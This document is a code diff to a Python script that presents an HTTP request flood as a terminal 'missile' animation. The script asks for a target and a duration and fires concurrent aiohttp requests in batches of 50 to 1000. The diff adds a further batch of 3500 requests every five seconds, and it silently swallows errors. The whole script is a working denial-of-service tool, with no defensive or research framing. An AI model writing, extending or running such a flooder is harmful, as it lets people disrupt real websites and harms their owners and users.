@@ -8,25 +8,17 @@ import shutil
 # Terminal size
 TERMINAL_SIZE = shutil.get_terminal_size((80, 40))
 TERMINAL_WIDTH = TERMINAL_SIZE.columns
-TERMINAL_HEIGHT = TERMINAL_SIZE.lines - 2  # leave 2 lines for safe bottom
+TERMINAL_HEIGHT = TERMINAL_SIZE.lines - 2  # leave 2 lines at bottom
 
 # Clear terminal
 def clear():
     print("\033[H\033[J", end="")  # ANSI clear for Termux
 
-# Countdown loader with fake headers
+# Countdown loader
 async def countdown_loader(seconds):
-    fake_headers = [
-        {"User-Agent": "Mozilla/5.0"},
-        {"X-Fake-Header": "TOS-1"},
-        {"X-Test": "Reloading"},
-    ]
     for i in range(seconds, 0, -1):
         clear()
         print(f"SG - RELOADING | {i}s")
-        print("Injecting headers:")
-        for h in fake_headers:
-            print(f"  {list(h.keys())[0]}: {list(h.values())[0]}")
         await asyncio.sleep(1)
 
 # Small missile body
@@ -46,21 +38,26 @@ EXHAUST_FRAMES = [
     "\033[93m ::: \033[0m"
 ]
 
-# Map speed to missile type and batch
-MISSILE_TYPES = {
-    1: ("Average", 50),
-    2: ("Ballistic", 200),
-    3: ("Hypersonic", 300),
-    4: ("Shark-Z3 Ultra", 1000)
+# Missile types: speed -> request batch
+MISSILE_BATCHES = {
+    1: 50,     # avg
+    2: 200,    # ballistic
+    3: 300,    # hypersonic
+    4: 1000    # Shark-Z3 ultra
 }
 
-class Missile:
-    def __init__(self):
-        self.reset()
+ULTRA_SUPER_BATCH = 3500  # new missile every 5s
 
-    def reset(self):
-        self.speed = random.choice([1,2,3,4])
-        self.name, self.batch = MISSILE_TYPES[self.speed]
+class Missile:
+    def __init__(self, speed=None):
+        self.reset(speed)
+
+    def reset(self, speed=None):
+        if speed:
+            self.speed = speed
+        else:
+            self.speed = random.choice([1,2,3,4])
+        self.batch = MISSILE_BATCHES.get(self.speed, 50)
         self.x = TERMINAL_WIDTH // 2 - len(MISSILE_BODY[0]) // 2
         self.y = TERMINAL_HEIGHT
         self.active = False
@@ -74,7 +71,7 @@ class Missile:
                 self.reset()
                 self.active = False
 
-# Draw missiles with batch note
+# Draw missiles with only number of requests
 def draw_missiles(missiles):
     buffer = [""] * TERMINAL_HEIGHT
     for missile in missiles:
@@ -82,18 +79,20 @@ def draw_missiles(missiles):
             for i, line in enumerate(MISSILE_BODY):
                 pos = missile.y - len(MISSILE_BODY) + i
                 if 0 <= pos < TERMINAL_HEIGHT:
+                    # only display batch beside first line
                     if i == 0:
-                        buffer[pos] += " " * missile.x + line + f"  [{missile.name} {missile.batch} REQ]"
+                        buffer[pos] += " " * missile.x + line + f"  [{missile.batch}]"
                     else:
                         buffer[pos] += " " * missile.x + line
+            # exhaust at bottom
             exhaust_pos = missile.y
             if 0 <= exhaust_pos < TERMINAL_HEIGHT:
                 buffer[exhaust_pos] += " " * missile.x + random.choice(EXHAUST_FRAMES)
     clear()
     print("\n".join(buffer))
 
-# Send missile batch requests
-async def send_missile_requests(target, batch):
+# Send batch requests
+async def send_requests(target, batch):
     async with aiohttp.ClientSession() as session:
         tasks = []
         for _ in range(batch):
@@ -103,14 +102,24 @@ async def send_missile_requests(target, batch):
         except:
             pass
 
+# Ultra-super missile every 5s
+async def ultra_super_missile(target, duration):
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        asyncio.create_task(send_requests(target, ULTRA_SUPER_BATCH))
+        await asyncio.sleep(5)
+
 # Main loop
 async def main():
     target = input("¿TARGZ > ")
     duration = int(input("¿DU > "))
 
-    await countdown_loader(5)  # 5s reload with fake headers
+    await countdown_loader(5)
 
     missiles = [Missile() for _ in range(2)]  # mini swarm
+
+    # Start ultra-super missile task
+    asyncio.create_task(ultra_super_missile(target, duration))
 
     start_time = time.time()
     last_launch_times = [0]*len(missiles)
@@ -121,8 +130,7 @@ async def main():
             if not missile.active and now - last_launch_times[idx] >= missile.launch_delay:
                 missile.active = True
                 last_launch_times[idx] = now
-                # Launch missile batch async
-                asyncio.create_task(send_missile_requests(target, missile.batch))
+                asyncio.create_task(send_requests(target, missile.batch))
             missile.move()
         draw_missiles(missiles)
         await asyncio.sleep(0.05)
